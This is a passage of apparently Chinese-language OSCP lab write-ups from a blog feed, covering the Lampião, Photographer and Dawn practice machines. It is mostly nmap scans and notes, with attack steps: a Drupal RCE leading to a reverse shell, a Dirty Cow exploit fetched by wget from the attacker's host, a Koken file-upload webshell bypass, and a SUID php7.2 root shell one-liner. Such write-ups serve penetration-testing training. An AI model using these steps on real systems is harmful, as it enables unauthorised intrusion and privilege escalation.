</span><br><span class="line">|     |_|/ ___ ___ __ _ ___ _ _ </span><br><span class="line">|     \x20| __/ (_| __ \x20|_| |_ </span><br><span class="line">|     ___/ __| |___/ ___|__,_|___/__, ( ) </span><br><span class="line">|     |___/ </span><br><span class="line">|     ______ _ _ _ </span><br><span class="line">|     ___(_) | | | |</span><br><span class="line">|     \x20/ _` | / _ / _` | | | |/ _` | |</span><br><span class="line">|_    __,_|__,_|_| |_|</span><br><span class="line">1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Lampi\xC3\xA3o</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port80-TCP:V=7.94SVN%I=7%D=4/16%Time=661E440F%P=x86_64-pc-linux-gnu%r(N</span><br><span class="line">SF:ULL,1179,&quot;\x20_____\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\|_\x20\x20\x20_\|\x20\|\x20\</span><br><span class="line">SF:(\x20\)\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2</span><br><span class="line">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\n\x20\x20\|\x20\|\x20\|\x20\|_\|/\x20___\x20\x20\x20\x20___\x20\</span><br><span class="line">SF:x20__\x20_\x20___\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2</span><br><span class="line">SF:0\n\x20\x20\|\x20\|\x20\|\x20__\|\x20/\x20__\|\x20\x20/\x20_\x20\\/\x20</span><br><span class="line">SF:_`\x20/\x20__\|\x20\|\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x2</span><br><span class="line">SF:0_\|\x20\|_\|\x20\|_\x20\x20\\__\x20\\\x20\|\x20\x20__/\x20\(_\|\x20\\_</span><br><span class="line">SF:_\x20\\\x20\|_\|\x20\|_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\\___/\x20\\_</span><br><span class="line">SF:_\|\x20\|___/\x20\x20\\___\|\\__,_\|___/\\__,\x20\(\x20\)\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20__/\x20\|/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x2</span><br><span class="line">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|___/\x20\x20\x20\x20\x2</span><br><span class="line">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\n______\x20_\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x2</span><br><span class="line">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\n\|\x20\x20___\(_\)\x20\x2</span><br><span class="line">SF:0\x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\|</span><br><span class="line">SF:\n\|\x20\|_\x20\x20\x20_\x20\x20\x20\x20__\|\x20\|_\x20\x20\x20_\x20_\x</span><br><span class="line">SF:20__\x20___\x20\x20\x20__\x20_\x20\x20\x20\x20___\x20\x20__\x20_\x20_\x</span><br><span class="line">SF:20\x20\x20_\x20\x20__\x20_\|\x20\|\n\|\x20\x20_\|\x20\|\x20\|\x20\x20/\</span><br><span class="line">SF:x20_`\x20\|\x20\|\x20\|\x20\|\x20&#x27;_\x20`\x20_\x20\\\x20/\x20_`\x20\|\x2</span><br><span class="line">SF:0\x20/\x20_\x20\\/\x20_`\x20\|\x20\|\x20\|\x20\|/\x20_`\x20\|\x20\|\n\|</span><br><span class="line">SF:\x20\|\x20\x20\x20\|\x20\|\x20\|\x20\(_\|\x20\|\x20\|_\|\x20\|\x20\|\x2</span><br><span class="line">SF:0\|\x20\|\x20\|\x20\|\x20\(_\|\x20\|\x20\|\x20\x20__/\x20\(_\|\x20\|\x2</span><br><span class="line">SF:0\|_\|\x20\|\x20\(_\|\x20\|_\|\n\\_\|\x20\x20\x20\|_\|\x20\x20\\__,_\|\</span><br><span class="line">SF:\__,_\|_\|\x20\|_\|&quot;);</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 3.11 - 4.1 (91%), Linux 3.2.0 (90%), Linux 3.16 (90%), Linux 4.4 (90%), Linux 3.13 (89%), Linux 3.10 - 3.12 (87%), Linux 3.10 - 4.11 (87%), Linux 3.12 (87%), Linux 3.13 or 4.2 (87%), Linux 3.16 - 4.6 (87%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 4 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>访问80端口，没啥有用的信息，1898端口如下</p><p><a href="https://smms.app/image/3VDMkreY2zxmKlN" target="_blank"><img src="https://s2.loli.net/2024/04/16/3VDMkreY2zxmKlN.png" ></a></p><p>扫一下目录，可以看到不少感兴趣的目录</p><p><a href="https://smms.app/image/wlyGNtz7eTv2Pqi" target="_blank"><img src="https://s2.loli.net/2024/04/16/wlyGNtz7eTv2Pqi.png" ></a></p><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>分析几个目录的内容</p><p>在<a href="http://192.168.212.48:1898/sites/README.txt%E4%B8%AD%E6%8F%90%E7%A4%BA%E6%88%91%E5%8E%BB%E6%89%BEINSTALL.txt%EF%BC%8CCMS%E5%8F%AF%E8%83%BD%E6%98%AFDrupal%EF%BC%9F">http://192.168.212.48:1898/sites/README.txt中提示我去找INSTALL.txt，CMS可能是Drupal？</a></p><p>INSTALL.txt只是一个安装指南，好像没发现有用的东西</p><p>扫描到一个<a href="http://192.168.212.48:1898//CHANGELOG.txt%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%98%AF%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0%EF%BC%8C%E6%8B%BF%E5%88%B0%E5%BD%93%E5%89%8D%E7%89%88%E6%9C%AC%E5%BA%94%E8%AF%A5%E6%98%AFDrupal">http://192.168.212.48:1898//CHANGELOG.txt，发现是版本更新，拿到当前版本应该是Drupal</a> 7.54</p><p>在<a href="http://192.168.212.48:1898/scripts/test.script%EF%BC%8C%E4%B8%AD%E7%9A%84%E5%86%85%E5%AE%B9%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0">http://192.168.212.48:1898/scripts/test.script，中的内容可以看到</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">This file is for testing purposes only.</span><br><span class="line"></span><br><span class="line">It is used to test the functionality of drupal_get_filename().  See BootstrapGetFilenameTestCase::testDrupalGetFilename() for more information.</span><br></pre></td></tr></table></figure><p>好像没看到利用的点，查了一下Drupal 的CVE，发现CVE-2018-7600可以直接拿来用</p><p>可以直接RCE，然后上传反弹shell，拿到低权限shell</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>发现是4.x的内核，直接Dirty Cow提权，用的是&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40847.cpp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@lampiao:/tmp$ wget http://192.168.45.224:8000/zn.cpp</span><br></pre></td></tr></table></figure><p>被控主机执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow zn.cpp -lutil</span><br><span class="line">./dcow -s</span><br></pre></td></tr></table></figure><p>注意这里一定要先转换成交互式shell再执行，不然提权失败</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCPLab-Photographer</title>
      <link href="/2024/04/16/OSCPLab-Photographer/"/>
      <url>/2024/04/16/OSCPLab-Photographer/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>端口开放情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">8000/tcp open  http-alt</span><br></pre></td></tr></table></figure><p>端口具体信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 41:4d:aa:18:86:94:8e:88:a7:4c:6b:42:60:76:f1:4f (RSA)</span><br><span class="line">|   256 4d:a3:d0:7a:8f:64:ef:82:45:2d:01:13:18:b7:e0:13 (ECDSA)</span><br><span class="line">|_  256 1a:01:7a:4f:cf:95:85:bf:31:a1:4f:15:87:ab:94:e2 (ED25519)</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Photographer by v1n1v131r4</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-generator: Koken 0.22.24</span><br><span class="line">|_http-title: daisa ahomi</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 5.0 - 5.5 (87%), Linux 2.6.32 or 3.10 (87%), Synology DiskStation Manager 5.1 (86%), Linux 4.15 - 5.8 (86%), Linux 5.0 (86%), Linux 5.0 - 5.4 (86%), Linux 2.6.32 (86%), Linux 2.6.39 (86%), Linux 3.10 - 3.12 (86%), Linux 3.4 (86%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 4 hops</span><br><span class="line">Service Info: Host: PHOTOGRAPHER; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: photographer</span><br><span class="line">|   NetBIOS computer name: PHOTOGRAPHER\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: photographer</span><br><span class="line">|_  System time: 2024-04-15T12:23:09-04:00</span><br><span class="line">|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-04-15T16:23:09</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先看一下smb服务能否匿名登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 192.168.237.76</span><br></pre></td></tr></table></figure><p>返回了三个共享文件夹</p><pre><code>    Sharename       Type      Comment    ---------       ----      -------    print$          Disk      Printer Drivers    sambashare      Disk      Samba on Ubuntu    IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))</code></pre><p>查看sambashare目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.237.76/sambashare</span><br></pre></td></tr></table></figure><p>发现两个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Thu Aug 20 11:51:08 2020</span><br><span class="line">  ..                                  D        0  Thu Aug 20 12:08:59 2020</span><br><span class="line">  mailsent.txt                        N      503  Mon Jul 20 21:29:40 2020</span><br><span class="line">  wordpress.bkp.zip                   N 13930308  Mon Jul 20 21:22:23 2020</span><br></pre></td></tr></table></figure><p>再扫一下目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.237.76 -f -e php,txt,html,zip,rar,tar.gz,tar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure><p>访问80端口和8000端口</p><p><a href="https://smms.app/image/r3YiVQdZnB7H6MJ" target="_blank"><img src="https://s2.loli.net/2024/04/16/r3YiVQdZnB7H6MJ.png" ></a></p><p><a href="https://smms.app/image/HOKIsA7zJSQMXpx" target="_blank"><img src="https://s2.loli.net/2024/04/16/HOKIsA7zJSQMXpx.png" ></a></p><p>发现&#x2F;admin目录</p><p><a href="https://smms.app/image/6qOpMAJthEliG2y" target="_blank"><img src="https://s2.loli.net/2024/04/16/6qOpMAJthEliG2y.png" ></a></p><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>在mailsent.txt内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Message-ID: &lt;4129F3CA.2020509@dc.edu&gt;</span><br><span class="line">Date: Mon, 20 Jul 2020 11:40:36 -0400</span><br><span class="line">From: Agi Clarence &lt;agi@photographer.com&gt;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0</span><br><span class="line">X-Accept-Language: en-us, en</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">To: Daisa Ahomi &lt;daisa@photographer.com&gt;</span><br><span class="line">Subject: To Do - Daisa Website&#x27;s</span><br><span class="line">Content-Type: text/plain; charset=us-ascii; format=flowed</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line"></span><br><span class="line">Hi Daisa!</span><br><span class="line">Your site is ready now.</span><br><span class="line">Don&#x27;t forget your secret, my babygirl ;)</span><br></pre></td></tr></table></figure><p>猜测<a href="mailto:&#52;&#x31;&#50;&#57;&#70;&#x33;&#x43;&#x41;&#x2e;&#50;&#48;&#x32;&#x30;&#x35;&#x30;&#x39;&#64;&#x64;&#99;&#x2e;&#x65;&#x64;&#x75;">&#52;&#x31;&#50;&#57;&#70;&#x33;&#x43;&#x41;&#x2e;&#50;&#48;&#x32;&#x30;&#x35;&#x30;&#x39;&#64;&#x64;&#99;&#x2e;&#x65;&#x64;&#x75;</a>或者<a href="mailto:&#97;&#103;&#105;&#64;&#112;&#104;&#111;&#116;&#111;&#x67;&#x72;&#97;&#112;&#x68;&#x65;&#114;&#46;&#x63;&#111;&#109;">&#97;&#103;&#105;&#64;&#112;&#104;&#111;&#116;&#111;&#x67;&#x72;&#97;&#112;&#x68;&#x65;&#114;&#46;&#x63;&#111;&#109;</a>或者<a href="mailto:&#100;&#97;&#x69;&#x73;&#97;&#x40;&#112;&#x68;&#111;&#x74;&#111;&#103;&#114;&#97;&#112;&#x68;&#101;&#x72;&#x2e;&#99;&#x6f;&#x6d;">&#100;&#97;&#x69;&#x73;&#97;&#x40;&#112;&#x68;&#111;&#x74;&#111;&#103;&#114;&#97;&#112;&#x68;&#101;&#x72;&#x2e;&#99;&#x6f;&#x6d;</a>可能是后台的登录账号？，密码就是my babygirl ;)里面的排列组合，试出来账号是<a href="mailto:&#100;&#97;&#x69;&#x73;&#x61;&#x40;&#112;&#104;&#111;&#x74;&#111;&#x67;&#114;&#97;&#112;&#x68;&#x65;&#x72;&#x2e;&#x63;&#x6f;&#109;">&#100;&#97;&#x69;&#x73;&#x61;&#x40;&#112;&#104;&#111;&#x74;&#111;&#x67;&#114;&#97;&#112;&#x68;&#x65;&#x72;&#x2e;&#x63;&#x6f;&#109;</a>，密码babygirl </p><p>现在再看一下wordpress.bkp.zip的内容，找到wordpress的配置文件，发现有数据库信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">define( &#x27;DB_NAME&#x27;, &#x27;nome_do_banco_de_dados_aqui&#x27; );</span><br><span class="line"></span><br><span class="line">/** Usuário do banco de dados MySQL */</span><br><span class="line">define( &#x27;DB_USER&#x27;, &#x27;nome_de_usuario_aqui&#x27; );</span><br><span class="line"></span><br><span class="line">/** Senha do banco de dados MySQL */</span><br><span class="line">define( &#x27;DB_PASSWORD&#x27;, &#x27;senha_aqui&#x27; );</span><br></pre></td></tr></table></figure><p>通过koken cms搜到一个文件上传的洞，把php一句话重命名为image.php.jpg，然后bp抓包改一下后缀</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)</span><br></pre></td></tr></table></figure><p>根据漏洞描述，上传之后找到download按钮，这里会指向上传文件的路径</p><p><a href="https://smms.app/image/5oNi3dlQxwPfbUE" target="_blank"><img src="https://s2.loli.net/2024/04/16/5oNi3dlQxwPfbUE.png" ></a></p><p>这里是<a href="http://192.168.212.76:8000/storage/originals/32/d2/webshell.php">http://192.168.212.76:8000/storage/originals/32/d2/webshell.php</a></p><p>开始试了一句话，可以执行命令，但是弹不回shell，不知道为什么，后来用了自带的反弹shell才可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /usr/share/webshells/php/php-reverse-shell.php ./shell3.jpg</span><br></pre></td></tr></table></figure><p>拿到shell之后执行python -c “import pty; pty.spawn(‘&#x2F;bin&#x2F;bash’)”，查看权限是www-data</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>检查suid权限的文件，发现&#x2F;usr&#x2F;bin&#x2F;php7.2</p><p>直接执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php7.2 -r &quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;</span><br></pre></td></tr></table></figure><p>提权成功</p>]]></content>
      
      
      
        <tags>
            
            <tag> Labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCPLab-Dawn</title>
      <link href="/2024/04/16/OSCPLab-Dawn/"/>
      <url>/2024/04/16/OSCPLab-Dawn/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>端口信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">3306/tcp open  mysql</span><br></pre></td></tr></table></figure><p>端口详细信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.5.5-10.3.15-MariaDB-1</span><br><span class="line">|   Thread ID: 14</span><br><span class="line">|   Capabilities flags: 63486</span><br><span class="line">|   Some Capabilities: ODBCClient, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, InteractiveClient, FoundRows, SupportsCompression, Speaks41ProtocolNew, IgnoreSigpipes, DontAllowDatabaseTableColumn, ConnectWithDatabase, LongColumnFlag, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: &#125;_Bku+qy/x33E@QXD-T&gt;</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 3.12 (91%), Linux 4.4 (91%), Linux 4.9 (89%), Linux 2.6.18 (87%), Linux 3.10 - 4.11 (87%), Linux 3.11 - 4.1 (87%), Linux 3.2 - 4.9 (87%), Linux 5.1 (87%), Linux 3.10 - 3.16 (87%), Linux 2.6.32 (87%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 4 hops</span><br><span class="line">Service Info: Host: DAWN</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-04-15T04:39:11</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.9.5-Debian)</span><br><span class="line">|   Computer name: dawn</span><br><span class="line">|   NetBIOS computer name: DAWN\x00</span><br><span class="line">|   Domain name: dawn</span><br><span class="line">|   FQDN: dawn.dawn</span><br><span class="line">|_  System time: 2024-04-15T00:39:11-04:00</span><br><span class="line">|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 3306/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   269.94 ms bogon (192.168.45.1)</span><br><span class="line">2   269.93 ms 192.168.45.254</span><br><span class="line">3   273.83 ms 192.168.251.1</span><br><span class="line">4   273.95 ms bogon (192.168.222.11)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 31.84 seconds</span><br></pre></td></tr></table></figure><p>访问web页面，发现是正在建设中，扫一下目录，发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.222.11/logs/</span><br></pre></td></tr></table></figure><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>在&#x2F;logs&#x2F;目录发现management.log文件，发现用户ganimedes</p><figure class="highlight 